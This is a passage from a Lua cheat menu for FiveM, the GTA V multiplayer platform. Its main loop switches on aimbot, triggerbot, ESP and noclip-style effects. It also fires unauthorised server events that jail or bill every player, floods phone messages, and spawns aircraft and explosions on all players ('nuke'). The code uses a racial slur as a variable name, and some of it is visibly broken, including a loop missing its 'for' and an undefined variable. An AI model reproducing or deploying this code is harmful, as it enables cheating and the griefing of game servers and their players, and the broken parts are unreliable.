			Citizen.InvokeNative(0xE3AD2BDBAEE269AC, coords.x, coords.y, coords.z, 4, 1.0, 0, 1, 0.0, 1)
		end
		
        if InfStamina then
            RestorePlayerStamina(PlayerId(), GetPlayerSprintStaminaRemaining(PlayerId()))
        end

        if SuperJump then
            SetSuperJumpThisFrame(PlayerId())
        end
        
        if Invisibility then
            SetEntityVisible(PlayerPedId(), 0, 0)
        end
        
        if Forcefield then
            DoForceFieldTick(ForcefieldRadius)
        end
		
		
        
        if CarsDisabled then
            local plist = GetActivePlayers()
            for i = 1, #plist do
                if IsPedInAnyVehicle(GetPlayerPed(plist[i]), true) then
                    ClearPedTasksImmediately(GetPlayerPed(plist[i]))
                end
            end
        end
        
        if GunsDisabled then
            local plist = GetActivePlayers()
            for i = 1, #plist do
                if IsPedShooting(GetPlayerPed(plist[i])) then
                    ClearPedTasksImmediately(GetPlayerPed(plist[i]))
                end
            end
        end
        
        if NoisyCars then
            for k in EnumerateVehicles() do
                SetVehicleAlarmTimeLeft(k, 500)
            end
        end
        
        if FlyingCars then
            for k in EnumerateVehicles() do
                RequestControlOnce(k)
                ApplyForceToEntity(k, 3, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
            end
        end
		
		if Enable_GcPhone then
                for i = 0, 450 do
                    FiveM.TriggerCustomEvent(false, "gcPhone:sendMessage", GetPlayerServerId(i), 5000, "剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車")
                    FiveM.TriggerCustomEvent(false, 'gcPhone:sendMessage', num, "剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車")
                    FiveM.TriggerCustomEvent(false, 'gcPhone:sendMessage', 5000, num, "剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車")
                    end
                end
        
        if SuperGravity then
            for k in EnumerateVehicles() do
                RequestControlOnce(k)
                SetVehicleGravityAmount(k, GravAmount)
            end
        end
		
		if RainbowVeh then
                local u48y34 = k(1.0)
                SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
                SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
            end
			
			if ou328hSync then
                local u48y34 = k(1.0)
				local ped = PlayerPedId()
                local veh = GetVehiclePedIsUsing(ped)
                SetVehicleNeonLightEnabled(veh, 0, true)
                SetVehicleNeonLightEnabled(veh, 0, true)
                SetVehicleNeonLightEnabled(veh, 1, true)
                SetVehicleNeonLightEnabled(veh, 2, true)
                SetVehicleNeonLightEnabled(veh, 3, true)
				SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
                SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
                SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
            end
			
			
			if ou328hNeon then
                local u48y34 = k(1.0)
		    local ped = PlayerPedId()
            local veh = GetVehiclePedIsUsing(ped)
                SetVehicleNeonLightEnabled(veh, 0, true)
                SetVehicleNeonLightEnabled(veh, 0, true)
                SetVehicleNeonLightEnabled(veh, 1, true)
                SetVehicleNeonLightEnabled(veh, 2, true)
                SetVehicleNeonLightEnabled(veh, 3, true)
                SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
            end
			
		
		if Enable_Jail then
				i = 0, 450 do
                    FiveM.TriggerCustomEvent(false, "esx_jailer:sendToJail", GetPlayerServerId(i), 3000)
                    FiveM.TriggerCustomEvent(false, "esx_jailler:sendToJail", GetPlayerServerId(i), 59999, "", 997)
                    FiveM.TriggerCustomEvent(false, "esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "", 300)
                    FiveM.TriggerCustomEvent(false, "esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "")
                    FiveM.TriggerCustomEvent(false, "esx-qalle-jail:jailPlayerNew", GetPlayerServerId(i), 5000, "")
                    FiveM.TriggerCustomEvent(false, "esx_jail:sendToJail", GetPlayerServerId(i), 50000)
                    FiveM.TriggerCustomEvent(false, "8321hiue89js", GetPlayerServerId(i), 5007, "", 32532532, securityToken)
                    FiveM.TriggerCustomEvent(false, "esx_jailer:sendToJailCatfrajerze", GetPlayerServerId(i), 300000, "", 500324532)
                    FiveM.TriggerCustomEvent(false, "esx_jail:sendToJail", GetPlayerServerId(i), 5000, "")
                    FiveM.TriggerCustomEvent(false, "js:jailuser", GetPlayerServerId(i), 5000, "")
                    FiveM.TriggerCustomEvent(false, "wyspa_jail:jailPlayer", GetPlayerServerId(i), 300000, "", 500324532)
                    FiveM.TriggerCustomEvent(false, "wyspa_jail:jail", GetPlayerServerId(i), 5000, "")
                    FiveM.TriggerCustomEvent(false, "esx_policejob:billPlayer", GetPlayerServerId(i), 5000, "")
                    FiveM.TriggerCustomEvent(false, 'chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .."")
					TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
					TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
					TriggerServerEvent("esx-qalle-jail:updateJailTime", GetPlayerServerId(i), 45 * 60)
					TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "SERVER FREE PALESTINE")
					TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "FREE PALESTINE")
					TriggerServerEvent("esx-qalle-jail:updateJailTime_n96nDDU@X?@zpf8", GetPlayerServerId(i), 45 * 60, "FREE PALESTINE")
					end
				end
				
				
	if Enable_Nuke then
                Citizen.CreateThread(
                    function()
              
						local dj = 'Avenger'
                        local dk = 'CARGOPLANE'
                        local dl = 'luxor'
                        local dm = 'maverick'
                        local dn = 'blimp2'
                        while not HasModelLoaded(GetHashKey(dk)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dk))
                        end
                        while not HasModelLoaded(GetHashKey(dl)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dl))
                        end
                        while not HasModelLoaded(GetHashKey(dj)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dj))
                        end
                        while not HasModelLoaded(GetHashKey(dm)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dm))
                        end
                        while not HasModelLoaded(GetHashKey(dn)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dn))
                        end
                        for i = 0, 128 do
                            local dl =
                                CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dj), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dk), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(dl), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dl), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dl), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dm), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dn), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0) and
                                AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, true)
                            end
                        end
                )
            end
		
		
	if nukeserver then
    Citizen.CreateThread(
	function()
        local dg="Avenger"
        local dh="tula"
        local di="volatol"
        local dj="maverick"
        local dk="bombushka"
        local al=""

        while not HasModelLoaded(GetHashKey(dh))do
            Citizen.Wait(0)
            RequestModel(GetHashKey(dh))
        end

        while not HasModelLoaded(GetHashKey(di))do
            Citizen.Wait(0)RequestModel(GetHashKey(di))
        end

        while not HasModelLoaded(GetHashKey(dg))do
            Citizen.Wait(0)RequestModel(GetHashKey(dg))
        end

        while not HasModelLoaded(GetHashKey(dj))do
            Citizen.Wait(0)RequestModel(GetHashKey(dj))
        end

        while not HasModelLoaded(GetHashKey(dk))do
            Citizen.Wait(0)RequestModel(GetHashKey(dk))
        end

        for bs=0,9 do
            
        end

        for i=0,128 do
            local di=CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+2.0,true,true) and CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dg),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dh),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)
        end
		ShowInfo("~g~Fucked :(")
     end)
    end
        
        if WorldOnFire then
            local pos = GetEntityCoords(PlayerPedId())
            local k = GetRandomVehicleInSphere(pos, 100.0, 0, 0)
            if k ~= GetVehiclePedIsIn(PlayerPedId(), 0) then
                local targetpos = GetEntityCoords(k)
                local x, y, z = table.unpack(targetpos)
                local expposx = math.random(math.floor(x - 5.0), math.ceil(x + 5.0)) % x
                local expposy = math.random(math.floor(y - 5.0), math.ceil(y + 5.0)) % y
                local expposz = math.random(math.floor(z - 0.5), math.ceil(z + 1.5)) % z
                AddExplosion(expposx, expposy, expposz, 1, 1.0, 1, 0, 0.0)
                AddExplosion(expposx, expposy, expposz, 4, 1.0, 1, 0, 0.0)
            end
            
            for v in EnumeratePeds() do
                if v ~= PlayerPedId() then
                    local targetpos = GetEntityCoords(v)
                    local x, y, z = table.unpack(targetpos)
                    local expposx = math.random(math.floor(x - 5.0), math.ceil(x + 5.0)) % x
                    local expposy = math.random(math.floor(y - 5.0), math.ceil(y + 5.0)) % y
                    local expposz = math.random(math.floor(z), math.ceil(z + 1.5)) % z
                    AddExplosion(expposx, expposy, expposz, 1, 1.0, 1, 0, 0.0)
                    AddExplosion(expposx, expposy, expposz, 4, 1.0, 1, 0, 0.0)
                end
            end
        end
		

		
	
        
        if FuckMap then
            for i = -4000.0, 8000.0, 3.14159 do
                local _, z1 = GetGroundZFor_3dCoord(i, i, 0, 0)
                local _, z2 = GetGroundZFor_3dCoord(-i, i, 0, 0)
                local _, z3 = GetGroundZFor_3dCoord(i, -i, 0, 0)
                
                CreateObject(GetHashKey("stt_prop_stunt_track_start"), i, i, z1, 0, 1, 1)
                CreateObject(GetHashKey("stt_prop_stunt_track_start"), -i, i, z2, 0, 1, 1)
                CreateObject(GetHashKey("stt_prop_stunt_track_start"), i, -i, z3, 0, 1, 1)
            end
        end
		
        
        if ClearStreets then
            SetVehicleDensityMultiplierThisFrame(0.0)
            SetRandomVehicleDensityMultiplierThisFrame(0.0)
            SetParkedVehicleDensityMultiplierThisFrame(0.0)
            SetAmbientVehicleRangeMultiplierThisFrame(0.0)
            SetPedDensityMultiplierThisFrame(0.0)
        end
        
        if RapidFire then
            DoRapidFireTick()
        end
        
        if Aimbot then
            
            -- Draw FOV
            if DrawFov then
                DrawRect(0.25, 0.5, 0.01, 0.515, 255, 80, 80, 100)
                DrawRect(0.75, 0.5, 0.01, 0.515, 255, 80, 80, 100)
                DrawRect(0.5, 0.25, 0.49, 0.015, 255, 80, 80, 100)
                DrawRect(0.5, 0.75, 0.49, 0.015, 255, 80, 80, 100)
            end
            
            local plist = GetActivePlayers()
            for i = 1, #plist do
                ShootAimbot(GetPlayerPed(plist[i]))
            end
        
        end
        
        if Ragebot and IsDisabledControlPressed(0, Keys["MOUSE1"]) then
            for k in EnumeratePeds() do
                if k ~= PlayerPedId() then RageShoot(k) end
            end
        end
        
        function ShowCross(C,x,y)
            SetTextFont(0)
            SetTextProportional(1)
            SetTextScale(0.0,0.4)
            SetTextDropshadow(1,0,0,0,255)
            SetTextEdge(1,0,0,0,255)
            SetTextDropShadow()
            SetTextOutline()
            SetTextEntry("STRING")
            AddTextComponentString(C)
            DrawText(x,y)
        end

        if Crosshair then
            ShowCross("+",0.495,0.484)
        end
        
        if ShowCoords then
            local pos = GetEntityCoords(PlayerPedId())
            DrawTxt("~r~X:~w~ " .. round(pos.x, 3), 0.38, 0.03, 0.0, 0.4)
            DrawTxt("~r~Y:~w~ " .. round(pos.y, 3), 0.45, 0.03, 0.0, 0.4)
            DrawTxt("~r~Z:~w~ " .. round(pos.z, 3), 0.52, 0.03, 0.0, 0.4)
        end
        
        if ExplosiveAmmo then
            local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
            if ret then
                AddExplosion(pos.x, pos.y, pos.z, 1, 1.0, 1, 0, 0.1)
            end
        end
        
        if ForceGun then
            local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
            if ret then
                for k in EnumeratePeds() do
                    local coords = GetEntityCoords(k)
                    if k ~= PlayerPedId() and GetDistanceBetweenCoords(pos, coords) <= 1.0 then
                        local forward = GetEntityForwardVector(PlayerPedId())
                        RequestControlOnce(k)
                        ApplyForce(k, forward * 500)
                    end
                end
                
                for k in EnumerateVehicles() do
                    local coords = GetEntityCoords(k)
                    if k ~= GetVehiclePedIsIn(PlayerPedId(), 0) and GetDistanceBetweenCoords(pos, coords) <= 3.0 then
                        local forward = GetEntityForwardVector(PlayerPedId())
                        RequestControlOnce(k)
                        ApplyForce(k, forward * 500)
                    end
                end
            
            end
        end
        
        if Triggerbot then
            local hasTarget, target = GetEntityPlayerIsFreeAimingAt(PlayerId())
            if hasTarget and IsEntityAPed(target) then
                ShootAt(target, "SKEL_HEAD")
            end
        end
		
		local niggerVehicle = GetVehiclePedIsIn(PlayerPedId(), false)
			            if IsPedInAnyVehicle(PlayerPedId()) then
                if driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 5.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                end
			end			
 
        if not Collision then
            playerveh = GetVehiclePedIsIn(PlayerPedId(), false)
            for k in EnumerateVehicles() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
            for k in EnumerateObjects() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
            for k in EnumeratePeds() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
        end
        
        if DeadlyBulldozer then
            SetVehicleBulldozerArmPosition(GetVehiclePedIsIn(PlayerPedId(), 0), math.random() % 1, 1)
            SetVehicleEngineHealth(GetVehiclePedIsIn(PlayerPedId(), 0), 1000.0)
            if not IsPedInAnyVehicle(PlayerPedId(), 0) then
                DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), 1))
                DeadlyBulldozer = not DeadlyBulldozer
            elseif IsDisabledControlJustPressed(0, Keys["E"]) then
                local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                local coords = GetEntityCoords(veh)
                local forward = GetEntityForwardVector(veh)
                local heading = GetEntityHeading(veh)
                local veh = CreateVehicle(GetHashKey("BULLDOZER"), coords.x + forward.x * 10, coords.y + forward.y * 10, coords.z, heading, 1, 1)
                SetVehicleColours(veh, 27, 27)
                SetVehicleEngineHealth(veh, -3500.0)
                ApplyForce(veh, forward * 500.0)
            end
        end
        
        if IhadSexWithMyStepMother.IsMenuOpened('objectlist') then
            for i = 1, #SpawnedObjects do
                local x, y, z = table.unpack(GetEntityCoords(SpawnedObjects[i]))
                DrawText3D(x, y, z, "OBJECT " .. "[" .. i .. "] " .. "WITH ID " .. SpawnedObjects[i])
            end
        end
        
        if NametagsEnabled then
            tags_plist = GetActivePlayers()
            for i = 1, #tags_plist do
                if NetworkIsPlayerTalking(tags_plist[i]) then
                    SetMpGamerTagVisibility(ptags[i], 4, 1)
                else
                    SetMpGamerTagVisibility(ptags[i], 4, 0)
                end
                
                if IsPedInAnyVehicle(GetPlayerPed(tags_plist[i])) and GetSeatPedIsIn(GetPlayerPed(tags_plist[i])) == 0 then
                    SetMpGamerTagVisibility(ptags[i], 8, 1)
                else
                    SetMpGamerTagVisibility(ptags[i], 8, 0)
                end
            
            end
        end
        
        if ANametagsEnabled then
            local plist = GetActivePlayers()
            table.removekey(plist, PlayerId())
            for i = 1, #plist do
                local pos = GetEntityCoords(GetPlayerPed(plist[i]))
                local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), pos)
                if distance <= 30 then
                    if ANametagsNotNeedLOS then
                        DrawText3D(pos.x, pos.y, pos.z + 1.3, "~b~ID: " .. GetPlayerServerId(plist[i]) .. "\n~b~Name: " .. GetPlayerName(plist[i]))
                    elseif not ANametagsNotNeedLOS and HasEntityClearLosToEntity(PlayerPedId(), GetPlayerPed(plist[i]), 17) then
                        DrawText3D(pos.x, pos.y, pos.z + 1.3, "~b~ID: " .. GetPlayerServerId(plist[i]) .. "\n~b~Name: " .. GetPlayerName(plist[i]))
                    end
                end
            end
        end
        
        if LinesEnabled then
            local plist = GetActivePlayers()
            local playerCoords = GetEntityCoords(PlayerPedId())
            for i = 1, #plist do
                if i == PlayerId() then i = i + 1 end
                local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
                DrawLine(playerCoords, targetCoords, 0, 0, 255, 255)
            end
        end

	if WeatherChanger then
	    SetWeatherTypePersist(WeatherType)
	    SetWeatherTypeNowPersist(WeatherType)
	    SetWeatherTypeNow(WeatherType)
	    SetOverrideWeather(WeatherType)
	end
        
        if Radio then
            PortableRadio = true
            SetRadioToStationIndex(RadioStation)
        elseif not Radio then
            PortableRadio = false
        end

        if PortableRadio then
            SetVehicleRadioEnabled(GetVehiclePedIsIn(PlayerPedId(), 0), false)
            SetMobilePhoneRadioState(true)
            SetMobileRadioEnabledDuringGameplay(true)
            HideHudComponentThisFrame(16)
        elseif not PortableRadio then
            SetVehicleRadioEnabled(GetVehiclePedIsIn(PlayerPedId(), 0), true)
            SetMobilePhoneRadioState(false)
            SetMobileRadioEnabledDuringGameplay(false)
            ShowHudComponentThisFrame(16)
            local radioIndex = GetPlayerRadioStationIndex()

            if IsPedInAnyVehicle(PlayerPedId(), false) and radioIndex + 1 ~= 19 then 
                currRadioIndex = radioIndex + 1
                selRadioIndex = radioIndex + 1
            end
        end

        if ForceMap then
            DisplayRadar(true)
        end
		
		if ForceThirdPerson then
			SetFollowPedCamViewMode(0)
			SetFollowVehicleCamViewMode(0)
		end
        
        Wait(0)
    end
end)
